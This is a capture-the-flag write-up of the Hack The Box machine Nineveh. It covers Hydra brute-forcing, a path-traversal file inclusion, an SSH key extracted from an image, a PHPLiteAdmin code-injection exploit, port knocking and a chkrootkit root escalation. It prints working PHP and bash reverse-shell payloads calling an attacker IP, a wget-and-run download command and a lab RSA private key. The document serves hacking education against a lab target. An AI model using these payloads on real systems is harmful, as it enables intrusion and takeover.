---
title: "Nineveh"
description: "Writeup for Nineveh machine from HTB"
date: 2020-09-09
author: "Pablo Jesús González Rubio"
cover: "nineveh.png"
coverAlt: "Nineveh icon"
toc: true
tags: [ "Writeup" ]
---

## Scanning

First we put Nineveh in `/etc/hosts`:

```
10.10.10.43 nineveh.htb
```

Then we run Nmap against *nineveh.htb*:

```
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

## Enumeration

### Port 80 (HTTP)

Gobuster:

```
/icons/ (Status: 403)
/info.php (Status: 200)
/department/ (Status: 200)
/server-status/ (Status: 403)
```

On `/department`:

{{< img "login.png" "HTTP Login portal" "border" >}}

#### Bruteforce HTTP - Hydra

SQLI didn't work for me. Let's try to bruteforce it with user `admin`:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 64 -V -o hydra_department.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"
```

After 4649 password attemps, the 4650 was the valid one:

```
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
```

Bruteforcing should never be an option as it leaves lots of traces, and it's very noisy in logs terms.

{{< img "adminpage.png" "HTTP Admin Page" "border" >}}

In `/notes`:

```
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois
```

#### Local File Inclusion (LFI)

Looking at the url of `/notes`:

```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
```

We can see that `?notes=` can lead us to a Local File Inclusion, so:

```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd
```

Shows us all the users:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
```

For now it doesn't have much interest apart from knowing we can read or execute php files from the browser. We might use it later.

### Port 443 (HTTPS)

Gobuster:

```
/index.html (Status: 200)
/db (Status: 301)
/server-status (Status: 403)
/secure_notes (Status: 301)
```

#### Strings on image

On `/secure_notes` there's this image:

{{< img "secure_notes.png" "Secure Notes Image" "border" >}}

Running `strings` on the image let us see at the end lots of juicy info:

```
secret/
0000755
0000041
0000041
00000000000
13126060277
012377
ustar  
www-data
www-data
secret/nineveh.priv
0000600
0000041
0000041
00000003213
13126045656
014730
ustar  
www-data
www-data
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
secret/nineveh.pub
0000644
0000041
0000041
00000000620
13126060277
014541
ustar  
www-data
www-data
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

Taking this in account, now we have: the private SSH key and the public SSH key. Oh la la!

Let's put each one in `id_rsa` and `id_rsa.pub` respectively.

Looking at the nmap scan again there's no SSH port open, so that makes me think that we may have to knock some ports to open it. It's a security measure called [Port Knocking](../../../posts/port_cheatsheet/#22---ssh) which lets ports being closed until a user knocks other in some specific order.


Let's continue looking at other directories, on `/db`:

{{< img "phpliteadmin.png" "PHPLiteAdmin" "border" >}}

So the version of PHPLiteAdmin is `1.9`. Looking in *searchsploit* I found this [exploit](https://www.exploit-db.com/exploits/24044).

The exploit needs us to be logged in, so we'll look for it later.

#### Bruteforce HTTPS - Hydra

To login, let's bruteforce with the same technique as before:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 64 -V -o hydra_db.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
```

> Important! The method now uses *https-post-form*

Succesfully it returns:

```
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
```

We login with that password and...

{{< img "phpliteadminlogin.png" "PHPLiteAdmin Login" "border" >}}

## PHPLiteAdmin 1.9 Exploit

Now let's take again the [PHPLiteAdmin exploit](https://www.exploit-db.com/exploits/24044)!

> An Attacker can create a SQLite Database with a *PHP* extension and insert *PHP* Code as text fields.
> When done the Attacker can execute it simply by access the database file with the Webbrowser.

So to recreate that, we have to follow this steps:

```
1. We create a db named "hack.php".
The script will store the sqlite database in the same directory as phpliteadmin.php.

2. Now create a new table in this database and insert a text field with the default value:
<?php phpinfo()?>

3. Now we run hack.php
```

We create a db called *hack.php*.

Then we create a row called *hack* with one field:

{{< img "table.png" "Create Row" "border" >}}

This should be the result:

{{< img "database.png" "Result - Database" "border" >}}

Now we can create the reverse shell in 2 ways (that comes to my mind).

### Serve the Reverse Shell

We can do it by serving a file with a python SimpleHTTPServer and download it with:

```php
<?php system("wget YOURIP/reverse.txt -O /tmp/reverse.py; python /tmp/reverse.py"); ?>
```

Entering that script in the `default value` section like this:

{{< img "field.png" "Entering location of the Reverse Shell" "border" >}}

> IMPORTANT! The type value must be TEXT

### Use directly the reverse shell

**Or** we can use directly the reverse shell (which is the one I'm going to use):

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444 >/tmp/f"); ?>
```

For this we need to create an INTEGER value of 1 in the table of Hack we created before:

{{< img "field2.png" "Create Row" "border" >}}

And now we have to modify the value (*1*) in the `insert` menu and click on *Go*:

{{< img "insert.png" "Insert" "border" >}}

Here we have the table done:

{{< img "tabledone.png" "Final Table" "border" >}}

It says our *.php* is in `/var/tmp/hack.php` so let's try the LFI from the HTTP page so that we can run that script:

```txt
nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../var/tmp/hack.php
```

But it didn't work as it says the file name is too long. It seems to only work with the name `ninevehNotes.txt` in the URL, so let's rename the database to see if it works:

```txt
/var/tmp/hack.php  -> /var/tmp/ninevehNotes.txt.hack.php
```

{{< img "rename.png" "" "border" >}}

Now the url keeps like:

```
nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes.txt.hack.php
```

When running the page and listening with netcat:

```
nc -lnvp 4444
```

{{< img "wwwdata.png" "WWW-Data User" "border" >}}

Yay we are in!

I'm curious about the restrictions of the LFI. Reading the `manage.php`:

{{< img "manage.png" "Manage.php" "border" >}}

So yeah it had two restrictions, to not exceed 55 characters and that the filename must contain `ninevehNotes`.

And reading `login.php` we can see the variables for the login were hardcoded in the *PHP* script (Amrois mention they have now installed MySQL and the login page should be fixed haha):

{{< img "hardcoded.png" "Hardcoded User" "border" >}}

```html
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
```

## User - Amrois

I uploaded `linpeas.sh` to `/tmp` (Via the HTTP serving file method, link to my [Data Exfiltration](/../../posts/data_exfiltration/) post) and ran it. Interesting things that caught my attention were:

```
root      1290  0.8  0.2   8756  2224 ?        Ss   06:21   0:22 /usr/sbin/knockd -d -i ens33
...
[+] Unexpected folders in root
/report
...
[+] Modified interesting files in the last 5mins (limit 100)
/tmp/linpeas.txt
/report/report-20-09-09:07:01.txt
/report/report-20-09-09:07:05.txt
/report/report-20-09-09:07:03.txt
/report/report-20-09-09:07:02.txt
/report/report-20-09-09:07:04.txt
/var/log/syslog
/var/log/auth.log
/var/log/kern.log
```

Basically there's something writing reports in `/report` which is not a common root directory and the knocking mechanism I explained before. We'll have to investigate that.

### SSH Port Knocking

Looking at `/etc/knockd.conf`:

```
[options]
 logfile = /var/log/knockd.log
 interface = ens33

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

We can see we need to open SSH knocking at ports **571**, **290**, **911** in sequence. There are scripts for that like [this one](https://gist.github.com/tuxfight3r/9be119c2b53f0f69fcc0151fd2dad67e) or we can do it easily in bash with:

```bash
for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x <IP>; done
```

{{< img "knock.png" "SSH Port Knocking" "border" >}}

Now we have SSH open!!

Let's SSH log in as *Amrois*, as we have his private SSH key. If it says the permissions are *too open*, we just:

```
chmod 400 id_rsa
```

{{< img "amrois.png" "Amrois user" "border" >}}

## Root

### Analyse odd things w/ Linpeas

Now I ran `linpeas.sh` again to verify if we could see/do anything that `www-data` couldn't and these were the most relevant things:

```
# Cronjobs
# m h  dom mon dow   command
*/10 * * * * /usr/sbin/report-reset.sh
```

{{< img "writable.png" "Writable Files" "border" >}}

{{< img "reportreset.png" "Report-Reset.sh" "border" >}}

```
132238 4.0K drwxr-xr-x   2 amrois amrois 4.0K Sep  9 07:38 report
```

Reading one of the logs of the `/report` directory, we find:

```
ROOTDIR is `/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not found
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron'... not infected
Checking `crontab'... not infected
Checking `date'... not infected
Checking `du'... not infected
Checking `dirname'... not infected
Checking `echo'... not infected
Checking `egrep'... not infected
Checking `env'... not infected
Checking `find'... not infected
Checking `fingerd'... not found
Checking `gpm'... not found
Checking `grep'... not infected
Checking `hdparm'... not infected
Checking `su'... not infected
Checking `ifconfig'... not infected
Checking `inetd'... not tested
Checking `inetdconf'... not found
Checking `identd'... not found
Checking `init'... not infected
Checking `killall'... not infected
Checking `ldsopreload'... can't exec ./strings-static, not tested
Checking `login'... not infected
Checking `ls'... not infected
Checking `lsof'... not infected
Checking `mail'... not found
Checking `mingetty'... not found
Checking `netstat'... not infected
Checking `named'... not found
Checking `passwd'... not infected
Checking `pidof'... not infected
Checking `pop2'... not found
Checking `pop3'... not found
Checking `ps'... not infected
Checking `pstree'... not infected
Checking `rpcinfo'... not found
Checking `rlogind'... not found
Checking `rshd'... not found
Checking `slogin'... not infected
Checking `sendmail'... not found
Checking `sshd'... not infected
Checking `syslogd'... not tested
Checking `tar'... not infected
Checking `tcpd'... not infected
Checking `tcpdump'... not infected
Checking `top'... not infected
Checking `telnetd'... not found
Checking `timed'... not found
Checking `traceroute'... not found
Checking `vdir'... not infected
Checking `w'... not infected
Checking `write'... not infected
Checking `aliens'... no suspect files
Searching for sniffer's logs, it may take a while... nothing found
Searching for HiDrootkit's default dir... nothing found
Searching for t0rn's default files and dirs... nothing found
Searching for t0rn's v8 defaults... nothing found
Searching for Lion Worm default files and dirs... nothing found
Searching for RSHA's default files and dir... nothing found
Searching for RH-Sharpe's default files... nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... 
/lib/modules/4.4.0-62-generic/vdso/.build-id
/lib/modules/4.4.0-62-generic/vdso/.build-id
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
Searching for Maniac files and dirs... nothing found
Searching for RK17 files and dirs... nothing found
Searching for Ducoci rootkit... nothing found
Searching for Adore Worm... nothing found
Searching for ShitC Worm... nothing found
Searching for Omega Worm... nothing found
Searching for Sadmind/IIS Worm... nothing found
Searching for MonKit... nothing found
Searching for Showtee... nothing found
Searching for OpticKit... nothing found
Searching for T.R.K... nothing found
Searching for Mithra... nothing found
Searching for LOC rootkit... nothing found
Searching for Romanian rootkit... nothing found
Searching for Suckit rootkit... Warning: /sbin/init INFECTED
Searching for Volc rootkit... nothing found
Searching for Gold2 rootkit... nothing found
Searching for TC2 Worm default files and dirs... nothing found
Searching for Anonoying rootkit default files and dirs... nothing found
Searching for ZK rootkit default files and dirs... nothing found
Searching for ShKit rootkit default files and dirs... nothing found
Searching for AjaKit rootkit default files and dirs... nothing found
Searching for zaRwT rootkit default files and dirs... nothing found
Searching for Madalin rootkit default files... nothing found
Searching for Fu rootkit default files... nothing found
Searching for ESRK rootkit default files... nothing found
Searching for rootedoor... nothing found
Searching for ENYELKM rootkit default files... nothing found
Searching for common ssh-scanners default files... nothing found
Searching for suspect PHP files...
```

So it's searching for viruses each minute as `root` (because *amrois* doesn't have any cron generating the reports), and when it reaches 10 minutes `amrois` deletes everything in `/report`.

### Check Crons with PSPY

To verify which script is being run by *root*, let's upload `pspy`:

{{< img "pspy.png" "PSPY32" "border" >}}

### Chkrootkit 0.49 - Local Privilege Escalation

So *root* is  running `/root/vulnScan.sh` and that script runs `chkrootkit`. There's a privilege escalation [vulnerability](https://www.exploit-db.com/exploits/33899) in it that executes `/tmp/update` as *root*.

```
Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.

If an attacker knows you are periodically running chkrootkit (like in
cron.daily) and has write access to /tmp (not mounted noexec), he may
easily take advantage of this.
```

So... creating a file called `update` in `/tmp` with a reverse shell and giving it execution permissions:

```bash
echo -e "#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 3333 >/tmp/f" > /tmp/update
chmod +x /tmp/update
```

And waiting with netcat listening, grants us:

{{< img "root.png" "Rooted!" "border" >}}

Root! 🔓️